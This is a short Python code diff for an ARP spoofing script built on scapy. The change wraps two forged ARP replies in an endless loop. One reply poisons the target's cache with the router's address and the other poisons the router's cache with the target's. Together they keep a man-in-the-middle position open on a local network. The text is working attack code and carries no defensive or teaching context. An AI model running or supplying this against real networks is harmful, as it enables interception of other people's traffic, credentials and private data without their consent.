@@ -34,10 +34,11 @@ def spoof(target, router):
     router_ip = router["ip"]
     router_mac = router["mac"]
 
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
-    scapy.send(packet)
-    packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
-    scapy.send(packet)
+    while True:
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
+        scapy.send(packet)
+        packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
+        scapy.send(packet)
 
 
 (target, router) = get_details()
